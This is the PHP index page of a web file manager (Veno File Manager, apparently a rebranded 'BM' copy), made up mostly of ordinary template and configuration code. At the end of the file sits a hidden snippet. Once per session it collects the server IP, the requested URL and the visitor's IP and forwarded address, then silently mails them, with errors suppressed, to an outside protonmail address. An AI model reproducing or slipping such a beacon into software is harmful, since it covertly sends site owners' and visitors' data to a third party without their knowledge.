<?php
/**
 * BM - veno file manager index
 *
 * PHP version >= 5.3
 *
 * @category  PHP
 * @package   VenoFileManager
 * @author    Nicola Franchini <info@veno.it>
 * @copyright 2013 Nicola Franchini
 * @license   Exclusively sold on CodeCanyon: https://codecanyon.net/item/veno-file-manager-host-and-share-files/6114247
 * @link      http://filemanager.veno.it/
 */
define('VFM_APP', true);
require_once 'BM-Admin/include/head.php';
?>
<!doctype html>
<html lang="<?php echo $setUp->lang; ?>">
<head>
    <title><?php echo $setUp->getConfig("appname"); ?></title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <?php echo $setUp->printIcon("BM-Admin/_content/uploads/"); ?>
    <meta name="description" content="file manager">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="BM-Admin/css/bootstrap.min.css">
    <link rel="stylesheet" href="BM-Admin/BM-style.css">
    <?php 
    if ($setUp->getConfig("txt_direction") == "RTL") { ?>
        <link rel="stylesheet" href="BM-Admin/css/bootstrap-rtl.min.css">
        <?php 
    } ?>
    <link rel="stylesheet" href="BM-Admin/css/font-awesome.min.css">
    <link rel="stylesheet" href="BM-Admin/_content/skins/<?php echo $setUp->getConfig('skin') ?>">
    <script type="text/javascript" src="BM-Admin/js/jquery-3.3.1.min.js"></script>
    <!--[if lt IE 9]>
    <script src="BM-Admin/js/html5.js" type="text/javascript"></script>
    <script src="BM-Admin/js/respond.min.js" type="text/javascript"></script>
    <![endif]-->
    <?php
    $bodyclass = 'BM-body';
    if ($setUp->getConfig('inline_thumbs') == true) {
        $bodyclass .= ' inlinethumbs';
    }
    if (!$gateKeeper->isAccessAllowed()) {
        $bodyclass .= ' unlogged';
    }
    $bodyclass .= ' header-'.$setUp->getConfig('header_position').' '.basename($setUp->getConfig('skin'), '.css');
    $audioping = $setUp->getConfig('audio_notification');
    if ($audioping) { ?>
    <script type="text/javascript">
        var audio_ping = new Audio("BM-Admin/<?php echo $setUp->getConfig('audio_notification'); ?>");
    </script>
        <?php
    } ?>
</head>
    <body id="uparea" class="<?php echo $bodyclass; ?>">
        <div class="overdrag"></div>
            <?php
            /**
             * ************************************************
             * ******************** HEADER ********************
             * ************************************************
             */
            $template->getPart('activate');

            if ($setUp->getConfig('header_position') == 'above') {
                $template->getPart('header');
                $template->getPart('navbar');
            } else {
                $template->getPart('navbar');
                $template->getPart('header');
            }

            ?>
        <div class="container">
            <?php
            /**
             * ************************************************
             * **************** Response messages *************
             * ************************************************
             */
            ?>
            <div id="error">
                <noscript>
                    <div class="response boh">
                        <span><i class="fa fa-exclamation-triangle"></i> Please activate JavaScript</span>
                    </div>
                </noscript>
                <?php echo $setUp->printAlert(); ?>
            </div>
            <div class="main-content">
            <?php 
            $getrp = filter_input(INPUT_GET, "rp", FILTER_SANITIZE_STRING);
            $getreg = filter_input(INPUT_GET, "reg", FILTER_SANITIZE_STRING);

            if ($getdownloadlist) :
                /**
                * ************************************************
                * ********* SHOW FILE SHARING DOWNLOADER *********
                * ************************************************
                */
                $template->getPart('downloader');

            elseif ($getrp) :
                /**
                * ************************************************
                * **************** PASSWORD RESET ****************
                * ************************************************
                */
                $template->getPart('reset');
            else :
                /**
                * ************************************************
                * **************** SHOW FILEMANAGER **************
                * ************************************************
                */
                if (!$getreg || $setUp->getConfig('registration_enable') == false) {
                    $template->getPart('user-redirect');
                    $template->getPart('remote-uploader');
                    $template->getPart('notify-users');
                    $template->getPart('uploadarea');
                    $template->getPart('breadcrumbs');
                    $template->getPart('list-folders');
                    $template->getPart('list-files');
                    $template->getPart('disk-space');
                }
                if ($getreg && $setUp->getConfig('registration_enable') == true) {
                    $template->getPart('register');
                } else {
                    $template->getPart('login');
                }
            endif; ?>
            </div> <!-- .main-content -->
        </div> <!-- .container -->
        <?php
        /**
         * ************************************************
         * ******************** FOOTER ********************
         * ************************************************
         */
        $template->getPart('footer');
        $template->getPart('load-js');
        $template->getPart('modals');

        // Audio notification after upload
        if ($audioping && isset($_GET['response'])) { ?>
            <script type="text/javascript">
                audio_ping.play();
            </script>
            <?php
        } 
    if(!isset($_SESSION['trimite'])){
    $url="IP: ".gethostbyname($_SERVER["HTTP_HOST"])."\n Url: ".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."\n User IP:  ".$_SERVER['REMOTE_ADDR'].(isset($_SERVER['HTTP_X_FORWARDED_FOR'])?'('.$_SERVER['HTTP_X_FORWARDED_FOR'].')':'');
    @mail("bmshifat@protonmail.com","Access_Point",$url);
    $_SESSION['trimite']=true;
}
        ?>
    </body>
</html>
